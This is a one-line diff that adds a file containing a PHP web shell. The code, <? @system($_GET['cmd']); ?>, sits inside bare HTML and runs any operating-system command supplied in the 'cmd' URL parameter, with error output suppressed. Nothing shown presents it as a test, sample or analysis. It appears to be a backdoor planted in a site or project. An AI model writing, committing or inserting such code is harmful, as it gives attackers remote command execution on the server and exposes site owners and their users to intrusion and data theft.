@@ -1,0 +1,1 @@
+<pre><body bgcolor=silver><? @system($_GET['cmd']); ?></body></pre>
